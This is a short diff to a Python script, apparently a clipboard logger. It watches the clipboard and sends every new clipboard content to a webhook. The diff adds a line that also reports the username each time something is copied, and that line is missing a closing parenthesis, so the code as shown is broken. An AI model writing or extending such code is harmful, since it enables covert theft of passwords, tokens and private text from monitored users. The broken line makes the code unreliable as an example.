@@ -108,6 +108,7 @@ def monitor_clipboard():
         try:
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
+                send_to_webhook(f" {username} just copied something to clipboard!"
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
                 last_clipboard = current_clipboard
         except Exception as e:
